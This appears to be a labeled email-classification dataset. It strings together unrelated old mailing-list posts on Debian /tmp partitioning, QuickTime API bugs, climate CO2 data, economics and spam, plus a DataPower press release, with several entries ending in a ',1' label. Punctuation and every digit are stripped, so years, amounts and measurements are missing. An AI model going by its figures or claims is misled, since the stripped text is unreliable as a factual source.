customer experience gained from  developing software based accelerators  Kuznetsov s team raised the bar  and designed a system for processing XML in purpose built hardware  In        DataPower s effort produced XML Generation Three  XG     the  industry s fastest technology for XML processing  bar none   Today  XG   technology powers the industry s first wire speed XML  network devices  enabling secure  high speed applications and XML Web  Services  While other companies are just now marketing first versions of  products  DataPower is delivering its third generation of technology   providing an immediate return on technology investments to  industry leading customers and partners   DataPower s M I T  heritage is complemented by a management team that  brings decades of experience in the networking and computing industries   drawing veteran leaders from several successful companies including  Akamai  Argon  Cascade  Castle Networks  Sycamore and Wellfleet                                                                              DataPower Technology Secures      Million in Funding  Venrock Associates  Mobius Venture Capital and Seed Capital Back Pioneer  in XML Aware Networking for Web Services  CAMBRIDGE  Mass    July           DataPower Technology  Inc   the  leading provider of XML Aware network infrastructure  today announced  that it has secured      million in series B financing  Investors for  this round include Venrock Associates  Mobius Venture Capital and Seed  Capital Partners  Michael Tyrrell  of Venrock  Bill Burnham  of Mobius   and Jeff Fagnan  of Seed Capital  have joined DataPower s Board of  Directors   DataPower will use this funding to accelerate development  marketing and  sales of the company s breakthrough technology for XML Aware networking   Founded in       DataPower invented the world s first intelligent XML  networking devices  capable of transforming XML traffic and transactions  at the wire speed enterprises need to effectively embrace Web services  and other XML centric initiatives  DataPower s solutions are based on  its patent pending XML Generation Three  XG    technology    Enterprises are adopting XML at rapid rate to facilitate inter and  intra company communications but their network infrastructure is ill  prepared to

Re  Secure Sofware KeyOn Tue  Sep          at         PM        Yannick Gingras wrote    This make me wonder about the relative protection of smart cards   They have    an internal procession unit around  MHz   Can we consider them as trusted    hardware    The ability to ship smart cards periodicaly uppon cashing of a    monthly subscription fee would not raise too much the cost of  renting  the    system   Smart card do their own self encryption   Can they be used to    decrypt data needed by the system    The input of the system could me mangled    and the would keep a reference of how long it was in service       This sounds really feasible but I may be totaly wrong   I may also be wrong    about the safety of a smart card         What do you think    That s similar to using hard locks  either the old parallel  or the new usb    The problem is that that piece of hardware is trustworthy  but the rest of the PC isn t  so a cracker just needs to simulate the lock smart card  or peek at the executable after the lock has been deactivated   Regards  Luciano Rocha      Consciousness  that annoying time between naps   ,1
Re  The case for spamLucas Gonze   Spam is  the  tool for dissident news  since the fact that it s unsolicited   means that recipients can t be blamed for being on a mailing list   That depends on how the list is collected  or even on what the senders say about how the list is collected  Better to just put it on a website  and that way it can be surfed anonymously  AND it doesn t clutter my inbox    _________________________________________________________________ Chat with friends online  try MSN Messenger  http   messenger msn com  http   xent com mailman listinfo fork  ,1

UAE Ami  Linux Laptop   Important details Well  for one  it would free up the similar laptop I already got to just run Amithlon  or if that wasn t so fun  bsd  to run just OpenBSD   This is a near term thing I could look forward to   However  an  official  laptop seems unexciting to me with only the items mentioned   Most important are the particulars distinguishing the listed spec from a Dell       preferably     GeForce      Go or newer  pleasingly modern GPU  the    GeForce Go  with   MB video RAM  too little  I have is    not so much too slow as inefficient  with factory settings it would    actually crash from running too hot and too fast      Accelerating the Ami  and possibly OpenUAE graphics    is a necessity to meet for good speed in those environments     but an energy efficient GPU is a good sideeffect and     portability  read  battery lifetime  enabler         Great control over CPU state  by use of  internet keys      wired to BIOS bhipset routines directly or preferably a scroll     wheel   Also  hibernate that works  please        Bootable to USB     drives  e g  larger external ones      in BIOS  please      P  Dells overheat   They have a big heatsink and a little fan    to pull air through it  and if you don t elevate thelaptop off    the desk or table or bed it s on  the fan will  stay  on   Not good   for MTBS  mean time between service  unless you ve got an   angle on making money on service from Amigans            One excellent solution is to include a heatpipe which runs   behind the AMLCD  thus using the backside of the display   half as a radiator   though it interferes with the case notion   below    yes  Aavid or such makes some as a standard part         I prefer to include the heatpipe but employ the radiative   mass in elevating the laptop  i e  in the form of a catch handle   and second logo device behind the laptop  which generally   provides stow and attachment for elevation legs  move them   out farther to get to the next higher ekevation  until the sides   of the laptop are met    This also happens to provide a little   protection for USB    and      cables that I tend to keep   plugged in all the time  a bit longer port life  Please        A case color other than brown or black  and preferably  if the     display module NRE is entirely permissive  the capability to      run with the backlight off    Again  to save battery power  but     also as a feature  maybe you remember the iBooks modified    in this manner   The user has the privilege to pull out the    backlight diffuser and fiberoptic lightpipe CF assembly  with    its backreflector  and the whole warrantee   This provides    for excellent outdoor use  often with the diffuser reinserted    to keep depth of field distractions minimised       What would I like   A     putty color  any translucency     in or over a rosewood colored  in KDE color browser  I see    chocolate  firebrick and a couple of  indian red  that are great    candidates  base          I would also like to be able to at least turn off the backlight     without closing the lid  and to be  able  to fit an  external      light source such as a UV filtered solar collector  and glare     hood  to feed     into the backlight   Not only does this make an excellent      color environment but lets one work outdoors tolerably        The logo should be a coloration of a    minimal surface  as the MAA is trying to get me to renew    with   demos at http   astronomy swin edu au pbourke geometry     at first blush   We ll see what comes out of the contest and    maybe you ll like the mapping MathCAD does of the    logo to a minimal surface or manifold that reflects the    openness of AmigaOS  Ami  and Amiga community     MAA org has more references  I m sure      Obviously Elfin details   e g  the backlight inlet   Other details  USB  x preferred  FireWire would be needed if that s unavailable  Options like       b or attabhable WiFi hub for ethernet port should round out the offering   An option for just released      micron P   with mobile power features  could make more reviewers greenlight the series  much better power consumption  and almost certainly a higher a top clock come with that  CompactFlash  SmartMedia and MMC flash memory card interfaces would be very pleasant   I ve mentioned booting to USB  and booting from CF would be a pleasant extigency also  To that end  a backup solution with compression using USB   storage or the multimode drive is always a nice  bundle item  that or a chance to back out a patch under   OS        Blue skies  and clear water and fresh air    Waterproof to    feet    Ethernet ports plus onboard WiFi  Svelte    line frontpanel LCD and bright red pager LED  builtin G  cellphone functions  choice

Pluck and LuckAnyone who doesn t appreciate both PLUCK and LUCK is only looking at part of the equation   America has  in fact  moved hard toward Meritocracy   But    and this is a huge one    you don t necessarily find it on the Forbes list   There is an element of LUCK  even if only being in the right place at the right time  to go that high   Beyond the Forbes List  there are many ways in which almost pure LUCK is involved in significant wealth   Being a super model  for example  Though I think most people would be surprised by a lot of super models  Cindy Crawford was valedictorian of her high school   Most people  of course  aren t in those stratified realms   It is the rest of us who tend to sort   There is a huge philosophical problem with the concept of Merit in the first place   Rawls claims Merit doesn t exist   Sowell seems to agree at least in part  but I m sure Sowell would also state that the benefits of pretending it exists for society at large are enormous   And if Merit does exist then exactly what is it measuring   IQ   Purity of heart   Or the ability to satisfy customers   Functionally most people seem to equate Merit with IQ though they say it would be better if it were purity of heart   Yet the type of Merit that lands you on the Forbes list  or even just being a garden variety  millionaire next door  is more likely to be the  serving customers  definition   Differences due to merit  when they are perceived as such  generate far more animosity than differences due to luck   Luck can be forgiven  Superior performance  often not

Schuman wrote            Most of them seem to have Ivy League educations  or are Ivy League     dropouts suggesting to me that they weren t exactly poor to start     with       Actually  if I remember correctly from discussion of the list s   composition in Forbes about five or six years ago  the  best  way to   get on the Forbes     is to have  no  college at all  Can you say    Bootstraps   boys and girls  I knew you could         [Given that an undergraduate liberal arts degree from a state school    like  say  mine       is nothing but stuff they should have taught   you in a government run  high  school  you ll probably get more of    those  on the Forbes     as well as time goes on  If we ever get   around to having a good old fashioned government collapsing   transfer payment depression  an economic version of this summer s   government forest conflagration  caused by the same kind of   innumeracy that not clear cutting enough forests did out west this   summer      that should motivate more than a few erst slackers out   there  including me       to learn to actually feed themselves ]         The  next  category on the Forbes     list is someone with a    terminal  professional degree  like an MBA  PhD  MD  etc   from the   best school possible       Why  Because  as of about       the  best  way to get into Harvard    for instance  is to be  smart   not rich  Don t take my word for it    ask their admissions office  Look at the admissions stats over the   years for proof       Meritocracy  American Style  was  invented  at the Ivy League after   World War II  Even Stanford got the hint       and  of course    Chicago taught them all how  right       Practically  nobody  who   goes to a top    American institution of higher learning can actually   afford to go there these days  Unless  of course  their parents  who   couldn t afford to go there themselves  got terminal degrees in the   last    years or so  And their kids  still  had to get the grades    and  biased   by intelligence       test scores  to get in          The bizarre irony is that almost all of those people with  terminal    degrees  until they actually  own  something and  hire  people  or   learn to  make  something for a living all day on a profit and loss   basis  persist in the practically insane belief  like life after   death  that economics is some kind of zero sum game  that dumb people   who don t work hard for it make all the money  and  if someone  is    smart  works hard  and is rich  then they stole their wealth somehow       BTW  none of you guys out there holding the short end of this   rhetorical stick can blame  me  for the fact that I m using it to   beat you severely all over your collective head and shoulders  You   were  apparently  too dumb to grab the right end   I  went to   Missouri  and  I  don t have a degree in anything actually useful    much less a  terminal  one  which means  I  m broker than anyone on   this list    it s just that  you   of all people  lots with   educations far surpassing my own  should just plain know better  The   facts speak for themselves  if you just open your eyes and  look     There are no epicycles  the universe does not orbit the earth  and   economics is not a zero sum game  The cost of anything  including   ignorance and destitution  is the forgone alternative  in this case    intelligence and effort       [I will  however  admit to being educated  waay  past my level of   competence  and  by the way  you  discuss economics  so have you    apparently ]            BTW  if we ever actually  had  free markets in this country     including  the abolition of redistributive income and death taxes    all those smart people in the Forbes     would have  more  money  and   there would be  more  self made people on that list  In addition    most of the people who  inherited  money on the list would have    much  less of it  not even relatively speaking  Finally  practically   all of that  new  money would have come from economic efficiency and   not  stolen  from someone else  investment bubbles or not       That efficiency is called  progress   for those of you in The   People s Republics of Berkeley or Cambridge  It means more and better   stuff  cheaper  over time    a terrible  petit bourgeois concept   apparently not worthy of teaching by the educational elite

RE  CO  and climate  was RE  Goodbye Global Warming OK  let s bring some data into the discussion  http   www grida no climate vital    htm  A graph  derived from Vostok ice core samples  of CO  and temperature fluctuations over the past    k years      Recent high resolution studies of historical CO  concentrations and   temperatures over hundreds of thousands of years have shown a modest   correlation between the two  In a number of cases  CO  level increases   are not in phase with temperature increases and actually trail the   increase in temperature by a short time i e  increases in temperature   preceded increases in CO  concentrations  The more studies that are done   of the geological record  the more it seems that CO  concentrations are   correlated with temperature increases  but are not significantly   causative   Based on the Vostok data  you are right  there is a very strong correlation between temperature and CO  concentrations  but it doesn t always appear to be causal     With respect to absolute CO  concentrations  it is also important to   point out that our best data to date suggests that they follow a fairly   regular cycle with a period of about         years   Also correct    the peak of each cycle is at about         ppm CO      As it   happens  current CO  concentrations are within     of other previous   cyclical concentration peaks for which we have good data   Not correct  Mauna Loa data  and  show that the current CO  concentrations are at    ppm       greater  than the  highest  recorded value from the past    k years  Furthermore  CO  concentrations are growing at   ppm every    years  much faster than any recorded increase in the Vostok data  though perhaps the Vostok data isn t capable of such fine resolution      In other words  we may be adding to the CO  levels   No  we are  definitely  adding to CO  levels  Look at the following chart  http   www grida no climate vital    htm  Shows CO  concentrations since       the  historical record     Not only is the CO  increase over     years unprecedented in the Vostok record  it is clear that the rate of change is  increasing   not decreasing  There is no other compelling explanation for this increase  except for anthropogenic input  You re really out on the fringe if you re debating this    even global warming skeptics generally concede this point     but it looks a lot like we   would be building a molehill on top of a mountain in the historical   record   At the very least  there is nothing anomalous about current CO    concentrations   Wrong again  Current CO  levels are currently unprecedented over the past    k years  unless there is some mechanism that allows CO  levels to quickly spike  and then return back to  normal  background levels  and hence the spike might not show up in the ice cores    Still  by around           we will have reached     ppm CO   a level that even you would have a hard time arguing away     Also  CO  levels interact with the biosphere in a manner that ultimately   affects temperature   Again  the interaction is not entirely   predictable  but this is believed to be one of the regulating negative   feedback systems mentioned above   Yes  clouds and oceans are a big unknown  Still  we know ocean water has a finite capacity to store CO   and if the world temperature doesn t increase  but we all have Seattle like weather all the time  the effects would be enormous     Last  as greenhouse gases go  CO  isn t particularly potent  although it   makes up for it in volume in some cases   Gases such as water and   methane have a far greater impact as greenhouse gases on a per molecule   basis   Water vapor may actually be the key greenhouse gas  something   that CO  only indirectly effects through its interaction with the   biosphere   Correct   Data on relative contributions of greenhouse gasses  http   www grida no climate vital    htm  Note that methane concentrations now are  much  higher than pre industrial levels  many cows farting  and rice paddies outgassing   and methane is also a contributor in the formation of atmospheric water vapor  Another clearly anthropogenic increase in a greenhouse gas  I m in favor of reductions in methane levels as well   Data on water vapor here  http   www agu org sci_soc mockler html    CO  was an easy mark for early environmentalism  but all the recent   studies and data I ve seen gives me the impression that it is largely a   passenger on the climate ride rather than the driver   I tend to think that holistic  and techical approaches would work best in reducing global warming  I favor an energy policy that has a mix of solar  wind and nuclear  with all carbon based combustion using renewable sources of C H bonds  Aggressive pursuit of carbon sink strategies also makes sense  burying trees deep underground  for example   Approaches that involve reductions in lifestyle to a  sustainable  level are unrealistic    Americans just won t do it  you d be surprised at the number of climate change researchers driving SUVs   But  as California showed during last year s energy crisis  shifts in patterns of consumption are possible  and improved efficiency is an easy sell     Jim   ,1

[zzzzteana] Meaningful sentencesThe Scotsman   Thu    Aug         Meaningful sentences     Tracey Lawson       If you ever wanted to look like  one of the most dangerous inmates in prison  history   as one judge described Charles Bronson  now s your chance  Bronson    the serial hostage taker  not the movie star   has written a health and  fitness guide in which he shares some of the secrets behind his legendary  muscle power      Solitary Fitness   a title which bears testament to the fact that Bronson       has spent    of his    prison years in solitary confinement   explains how he  has turned himself into a lean  mean  fitness machine while living    hours a  day in a space just    feet by eight feet  on a diet of scrubs grub and at  virtually no cost      The book is aimed at those who want to get fabulously fit without spending a  fortune on gym memberships  protein supplements or designer trainers  and  starts with a fierce attack on some of the expensive myths churned out by the  exercise industry       I pick up a fitness mag  I start to laugh and I wipe my arse with it   is the  opening paragraph penned by Bronson   It s a joke and a big con and they call  me a criminal   You can t help feeling he has a point      This is not the first book that Bronson has written from behind bars  having  already published Birdman Opens His Mind  which features drawings and poems  created by Bronson while in prison  And he is not the first prisoner to  discover creative expression while residing at Her Majesty s pleasure      Jimmy Boyle  the Scots sculptor and novelist  discovered his artistic talents  when he was sent to Barlinnie Prison s famous special unit  which aimed to  help inmates put their violent pasts behind them by teaching them how to  express their emotions artistically  Boyle was sentenced to life for the  murder of  Babs  Rooney in       Once released  he moved to Edinburgh where he  has become a respected artist  His first novel  Hero of the Underworld  was  published in      and his autobiography  A Sense of Freedom  was made into an  award winning film      Hugh Collins was jailed for life in      for the murder of William Mooney in  Glasgow  and in his first year in Barlinnie prison stabbed three prison  officers  earning him an extra seven year sentence  But  after being  transferred to the same unit that Boyle attended  he learned to sculpt and  developed an interest in art  He later published Autobiography of a Murderer   a frank account of Glasgow s criminal culture in the     s  which received  critical praise      And Lord Archer doesn t seem to have had trouble continuing to write the books  that have made him millions while in jail  He recently signed a three book  deal with Macmillan publishers worth a reported     million  and is no doubt  scribbling away as we speak      So why is it that men like Collins  Bronson and Boyle  who can be so  destructive towards society on the outside  can become so creative once stuck  on the inside  Steve Richards  Bronson s publisher  has published many books  about criminal figures and believes the roots of this phenomenon are both  pragmatic and profound      He says   Prison is sometimes the first time some criminals will ever have  known a stable environment  and this can be the first time they have the  chance to focus on their creative skills       It may also be the first time that they have really had the chance of an  education  if their early years have been hard  It could be the first time  anyone has offered them the chance to explore their creative talents       However  Richards believes the reasons are also deeper than that  He says    Once they are behind bars  the cold light of day hits them  and they examine  the very essence of who they are       They ask themselves  am I a man who wants to be remembered for violence  Or  am I a man who can contribute to society  who can be remembered for something  good       Bronson   who was born Michael Gordon Peterson  but changed his name to that  of the Hollywood star of the Death Wish films   has  so far  been remembered  mainly for things bad  He was originally jailed for seven years for armed  robbery in       and has had a series of sentences added to his original term  over the years as a result of attacking people in prison  In      he was  jailed for life after being convicted of holding a teacher hostage for nearly  two days during a jail siege      Standing five feet ten and a half inches tall and weighing    lbs  he is  renowned for his strength  He has bent metal cell doors with his bare hands  and does up to         yes          press ups a day  As he puts it   I can hit  a man    times in four seconds  I can push     press ups in    seconds       But judging by our current obsession with health and exercise  Solitary  Fitness might be the book which will see Bronson s face sitting on every  coffee table in the land  He might be the man to give us the dream body which  so many so called fitness gurus promise but fail to motivate us into  Because  Bronson has learned to use words as powerfully as he can use his fists       All this crap about high protein drinks  pills  diets  it s just a load of  bollocks and a multi million pound racket   he writes  in what can only be  described as a refreshingly honest style   We can all be fat lazy bastards   it s our choice  I m sick of hearing and reading about excuses  if you stuff  your face with shit you become shit  that s logical to me       As motivational mantras go  that might be just the kick up the  er  backside  we all needed        Solitary Fitness by Charles Bronson is published by Mirage Publishing and will  be available in bookstores from October at

Re  Moving  tmp to a separate partition  Advice On Sunday    May               Klistvud wrote     Howdy  fellow Debianites     Given some extra hard drive space  I decided to move my  tmp dir     currently located under     to a partition of its own  I am looking    forward to any advice  particularly of the been there done that type       how should I configure my fstab entry  How does Debian installer do    it       Watch out for permissions     tmp is         rwxrwxrwt   it has to  be world writable and have the sticky bit set  which ensures that only  users who create files in there can write to them   Permissions come  from the mounted FS  not the mount point  so make sure you set these  permissions while it s mounted       Because of the world writability  security conscious admins mount  it nodev and nosuid   If you re more careful  you can mount it noexec   too  but that will break some third party software installers that  work by examining your system  writing a custom config script inside   tmp somewhere  and then running it       So your fstab entry might look like        dev with temp   tmp ext  nosuid nodev                 is there anything Debian specific to watch for       Not that I recall         is it true that setting  tmp permissions to non executable  while    hardening your box  prevents apt from working properly       Setting  tmp to non executable by the noexec mount option does break   things  but as I said above  my recollection is that it mostly breaks   third party stuff   I think the apt scripts are all in  var lib dkpg info   and are run from there     Setting the  directory  noexec seems very bad  since the exec bit  on directories controls the ability to cd to it  and turning that  off would make it largely useless        As to  why   on moderately high availability multi user systems  I   often put  tmp on a separate partition precisely so I can use mount  options to globally control access   This is more important in a   truly multi user system than a home system  of course       Misbehaving apps rarely but sometimes blow the lid off of  tmp  and  having it be on its own partition means this doesn t compromise the  system as a whole  and you can easily figure out what s going on by   seeing the logged errors and looking at  df  output   Some folks keep   var log on a separate partition for similar reasons       Again  all of this is more important in a multi user production   environment   On my home systems  I mostly don t worry about this  sort of thing             A         Andrew Reid   reidac bellatlantic net           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org                    reidac bellatlantic net      ,1

Colonial Script    Oh  they were plenty upset about the tea taxes   But the crack down on colonial script certainly screwed over the American Colonies   And  BTW  England as well   Dear Ben Franklin was right for the wrong reasons   First of all the colonies were not prosperous compared to England proper   Second  the issuance of colonial script had nothing to do with full employeement    In fact  it is almost inconceivable he would make that claim   It sounds like a modern Keynsian was creating an urban legend    OTOH the lack of sufficient circulating monetary instruments was economically crippling   Imagine trying to buy your supplies by offering IOUs on your own name    and then trying to market   exchange the paper as the merchant who took the IOU                                The most common problem in the world is when a government prints too much money   The effects are a complete disaster   There are a lot of incentives that push governments into doing this even though it is incredibly stupid   So almost all the literature talks about that   But you can ALSO screw an economy over by taking all the money out of circulation   The fundamental cause of the American Great Depression was exactly this  courtesy of the Federal Reserve Board   I don t think shifting the power to print money to the bank of Canada had much effect   And Canada is still a prosperous country             Original Message        From  fork admin xent com [mailto fork admin xent com] On Behalf Of Gary   Lawrence Murphy   Sent  Saturday  September               AM   To  Mr  FoRK   Cc  fork spamassassin taint org   Subject  Re  sed  s United States Roman Empire g             f     fork list  writes           f   Free trade and free markets have proven their ability to lift       f  whole societies out of poverty  I m not a       f  socio political history buff   does anybody have some clear       f  examples       China   Ooops  no wait  scratch that       There is one counter example that I can think of  but it may not be   precisely  free trade markets     when Ben Franklin first visited   England he was asked why the colonies were so prosperous   Ben   explained that they used  Colonial Script   a kind of barter dollar    and increasing the supply of script ensured complete employment   The   British bankers were furious and immediately lobbied parliament to   clamp down on the practice   Within a few years  the colonies were   rife with unemployment and poverty just like the rest of the Empire       According to questionable literature handed out by a fringe political   party here in Canada  the Founding Fathers had no real complaint about   tea taxes  it was the banning of colonial script they were   protesting  If this is true  then it comes right back to the forces   that killed Ned Ludd s followers as to why popular opinion believes   they were protesting a tea tax   The same pamphlet claimed that Canada   was also a prosperous nation until  by an act of parliament in the   late    s or early    s  the right to print money was removed from the   juristiction of parliament and handed over to the Bank of Canada       I ve wondered about all this   Certainly the timeline of the collapse   of the Canadian economy fits the profile  but there are oodles of   other causes  for example  spending money like we had    M people when   we only had   M  Anyone have any further information on this            Gary Lawrence Murphy   garym teledyn com   TeleDynamics Communications      blog  http   www auracom com  teledyn   biz  http   teledyn com         Computers are useless  They can only give you answers    Picasso    ,1

probably related to my not having an  unseen  sequence anywhere    certainly not in inbox    I read all of my outstanding mail before I   tried this new exmh          Second  I ve been used to having a key binding which was to Msg_MarkUnseen   which doesn t seem to exist any more  and I m not sure what I should replac   e   that with    There s obviously a way as the  Sequences  menu does this    The  Mark Unseen  menu entry in the message  More  menu is still wanting   that function as well             For those who have other sequences defined  the window will widen to       display the other sequences       Any chance of having that lengthen instead    I like all my exmh stuff   in nice columns  fits the display better     That is  I use the detached   folder list  one column    The main exmh window takes up full screen    top to bottom  but less than half the width  etc         I have space for more sequences  in the  unseen  window  as long as they   remain once nice narrow window  best would be if the sequences could be   ordered by some preference  then ones which didn t fit would just fall   off the bottom  and not be shown        I d also prefer it if that window had no unusual background colouring    just one constant colour   I have been running the unseen window with   background black  on a root window that is all black  with no borders or   other decorations  but made  sticky    the appearance is just like the   folders with unseen messages  and their counts  are written into the   root window  because it is sticky  this small display follows me around   and do I can see when new mail needs processing        I also find that I tend to have a bunch of sequences that only ever occur   in one folder  some I had forgotten I ever created    So in addition to   the  sequences to always show  and  sequences to never show   a   preference to only show sequences that occur in more than one folder   would be useful  and then have the sequences that occor only in the   folder I m visiting appear in the list when that folder is current    This is just to keep the list size somewhat manageable while remaining   productive  I quite often use a sequence to remember a particular message   in a folder   the name is used only there  and only for one message    it gives me a handle on the message which remains as the folder is   packed  sorted  etc        I haven t updated my exmh for some time now  so I m not sure if this   next one is new  or just new since      but the Sequences menu  on the   bar with New Flist Search      only contains  unseen  and  urgent     It would be useful if it contained all of the sequences that the folder   happens to have defined    A  New sequence  entry would also be useful    to mark the message with a sequence name that didn t previously exist    which can be done now using  Search  and the pick interface  but is   clumsy that way       Actually  you once could  now when I try this  entering a sequence name   in the pick box  and a single message number  or a range N N in the   list of messages  and no pick attributes at all  I now get          syntax error in expression  int        hit

    which made no differen   ce    Looks as if something is now saying    hit  when before it didn t  or   similar           I ve also changed the ftoc colorization as discussed briefly on the lis   t a        week or so ago       Any chance of making the current message a little brighter background    Just to make it stand out a fraction more than it does  maybe this is   more apparent to me than many  as I use very small fonts everywhere    the background of the ftoc line isn t very wide        Hope this helps       kre            _______________________________________________   Exmh workers

Sequence Grabber and Movie Sync   Recording starts earlierHi everyone     We are struggling with an offset issue in trying to sync a movie  playing in the background with the start of a sequence grabber record    The end result of the capture always seems to be ahead of the actual  movie that is playing back   We are trying to pipe the end result into  an audio echo cancellation library and this offset is causing pain     Here is the issue       We use SGDataProc callback for the recording and preview     We start by calling SGStartRecord   for the preview     We then PreRoll   the movie and set up all the capture movies     We share the SG SoundChannel clock with the movie  and the VideoChannel     After this is all complete we call SetMovieRate   to start the  movie   And then log a time stamp from the clock for recording   This  happens about   seconds after previewing     We call AddMediaSample   when the time stamps  adjusted for scale   passed into the proc are greater than the time set for recording   We  adjust the audio buffer and sample input so this is cut at the right  time based on the time stamp     We are using a USB Audio Mic and a USB Video Camera     We have good A V sync  lip sync     When we compare the recorded track to the background track the  recorded echo starts before the echo in the movie   This is by about      seconds give or take   One would expect the echo to happen after  not before     We have tried to manually offset the time stamp for start time   But  this then produces A V sync  lip sync  issues   I assume this is  because our  video frame is getting there faster than our audio frame   As one would expect     Is there any reason why these frames are getting dropped in the  recording   Does anyone have any ideas to get these   in sync     Thx for your time   Matt   _______________________________________________  Do not post admin requests to the list  They will be ignored   QuickTime API mailing list       QuickTime API lists apple com   Help Unsubscribe Update your Subscription   http   lists apple com mailman options quicktime api mlsubscriber tech   csmining org    This email sent to mlsubscriber tech csmining org    ,1

RE  Re[ ]  A moment of silence for the First Amendment  fwd    MF  I don t think free speech is a license to speak directly at   and be in the   MF  physical presence of any particular individual of your   choosing   especially   MF  when that individual is busy doing something else and isn t   interested   Yep  I agree           Sure   And that goes back to my second argument    Cohen    THey can   walk away    NObody compells them to stand there  I ll agree fully    But we still have a Constitutional right to speak out against   policies  actions and grievances      Again   If you want it another way  lets change the Constitution   Huh   Are you saying that whoever has the loudest voice gets to be heard  Shouting down a public speaker could be considered a form of censorship  If shouting down public speakers is  protected  it is only a matter of time before the people doing the shouting have their tactic used against them  every single time they open their mouth   The tactic is stupid and non productive and if generally used  will only result in chaos   The tactic is just stupid ego bation at best  unless the goal is to generate chaos  And humans whose goals and actions in life are to create chaos in society should be locked up  provided you can accurately identify them  which is not really possible anyway  but hey  this is my rant      IMHO   Bill   ,1

MovieAudioExtractionFillBuffer calling exit I m running QuickTime on Windows  XP SP   and have a reproducible way to  make MovieAudioExtractionFillBuffer in a C   program do something strange   It looks like it s calling exit   or doing something equivalent  but I can t  say for sure    What I do see is that immediately after calling  MovieAudioExtractionFillBuffer  execution continues in the destructors of my  statically allocated objects   If I replace the call to  MovieAudioExtractionFillBuffer with a call to exit    I see the same thing     I m using version     of the QuickTime SDK  but     long version   Gestalt gestaltQuickTimeVersion  version      populates version with  x           I can reproduce the same behavior with  version     of the QuickTime SDK  but Gestalt still returns the same thing  in this case     The QuickTime related things that happen before this are       QuickTime initializes normally    QuickTime reads metadata from one aac file    QuickTime reads metadata from a second aac file    Quicktime reads the audio properties of an mp  file    and then I call MovieAudioExtractionFillBuffer    The audio related function calls are     MovieAudioExtractionBegin  MovieAudioExtractionGetProperty kQTPropertyClass_MovieAudioExtraction_Audio      kQTMovieAudioExtractionAudioPropertyID_AudioStreamBasicDescription    MovieAudioExtractionSetProperty kQTPropertyClass_MovieAudioExtraction_Audio      kQTMovieAudioExtractionAudioPropertyID_AudioStreamBasicDescription      all of which work as expected  or at least I think they do      And then    MovieAudioExtractionFillBuffer    I can give more details about the API calls if necessary   I think I m  calling QuickTime correctly since it decodes audio successfully almost all  the time    with this file and many others  i e   MovieAudioExtractionFillBuffer returns normally    I ve had customers report  similar problems  but this is the first time I ve been able to reproduce it  reliably myself   Unfortunately it s with a complex program   My attempts to  reproduce this with a simpler program have failed   It seems to be  timing related but I can t do better than that at the moment     I d love some help figuring out what s happening in  MovieAudioExtractionFillBuffer  and even better some help making it go away   If I need to report this in some more official way to Apple to make that  happen  please let me know     Thanks much      DB     _______________________________________________  Do not post admin requests to the list  They will be ignored   QuickTime API mailing list       QuickTime API lists apple com   Help Unsubscribe Update your Subscription   http   lists apple com mailman options quicktime api mlsubscriber tech   csmining org    This email sent to mlsubscriber tech csmining org    ,1

How does the Finder decide that two drives are on the same   partition When I make two  local  disks via MacFuse and I try to eject one of them    the Finder insists on warning me that there are two drives on the same    partition  and giving me the option to unmount all of them or just the    one I tried to  This is very inconvenient for me     The mount command shows       MyFS fuse  on  Volumes MyFS_ Gig        MyFS fuse  on  Volumes MyFS_ Gig          My suspicion is that the Finder just looks for the mount   rom value    then calls volumes partitions on the same disk if they only vary in the    last number     Thoughts     Thanks   Jim O Connor    _______________________________________________  Do not post admin requests to the list  They will be ignored   Filesystem dev mailing list       Filesystem dev lists apple com   Help Unsubscribe Update your Subscription   http   lists apple com mailman options filesystem dev mlsubscriber tech   csmining org    This email sent to mlsubscriber tech csmining org    ,1

Re  [OT] Ubuntu vs Debian forums  was recompiling the kernel with a  different version name On Sunday    April               you wrote        But you do understand that desktop users _don t_ want to learn about       their OS  correct            Recently I was trying to show my    year old granddaughter  who runs Open      SuSU    on her laptop  how to do some small admin job   She said that she      didn t want to know   When I queried this  she said             When I am at school  the IT department does it for me   When I am at      home here  you do it for me   When I am in Japan  Daddy does it for me        Why do I need to know how to do it         That is the kind of user who can learn      Of course   That is why I was trying to show her       If the small admin job had     been  diagnose kernel crashes  and her answer would have been  I am a    brain surgeon  not a computer scientist  I fix the brain  you fix the    computer  Today is the one day off that I have to spend with my family    and I don t want to spend it with the computer instead   then her    reluctance would have been valid     I was  I thought  supporting your view that most many people simply don t   _want_ to know   Why does their reluctance have to be  valid      Are you saying that only those who want to learn to administer it should be   allowed to use Linux     Lisi           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org                    lisi reisz csmining org      ,1

[zzzzteana] Scissors are a snip for Third WorldThe Times   September             Scissors are a snip for Third World  From Richard Owen in Rome        IT IS one of the unanswered questions of the past year  what happens to the  millions of nail scissors confiscated by airport security officials from  passengers  hand luggage  Most are thrown away or recycled after being seized  as part of security measures since September     But an enterprising chaplain  is sending them to Catholic missionaries for distribution to Third World  hospitals and clinics  In theory travellers who have left nail scissors  nail  files  corkscrews or manicure sets from their hand luggage can arrange for  them to be returned  In practice many just shrug and leave the scissors by the  X ray scanners      Father Arturo Rossini  chaplain of Malpensa airport in Milan  said that  scissors were costly or unavailable in many parts of Africa  Asia and Latin  America      He told Corriere della Sera that he had  plucked up the courage  to ask the  authorities if he could have the confiscated scissors  With the help of a  retired airport policeman  he had packaged        nail scissors and manicure  sets  using the airport chapel as a packing centre      Packages were shipped in aircraft holds to Peru  Brasil  India  Mozambique   Argentina  Zambia and Kenya   In such countries  what we think of as a  personal grooming accessory can be a vital tool       The idea has been taken up at other Italian airports                                  Yahoo  Groups Sponsor                           Plan to Sell a Home  http   us click yahoo com J SnNA y lEAA MVfIAA  gSolB TM                                                                           To unsubscribe from this group  send an email to  forteana unsubscribe egroups com     Your use of Yahoo  Groups is subject to http   docs yahoo com info terms      ,1

Re  The case for spam Political mail  the snail kind  doesn t bother me   I like it a lot of the  time  because as crap as it is at least it s not the kind of info you get  on TV   Particularly for small time local politics  it s the best way to  get information   but what matters is that mail is speech  and political email has to be as well protected as any other political speech   Spam is  the  tool for dissident news  since the face that it s unsolicited means that recipients can t be blamed for being on a mailing list        http   xent com mailman listinfo fork  ,1
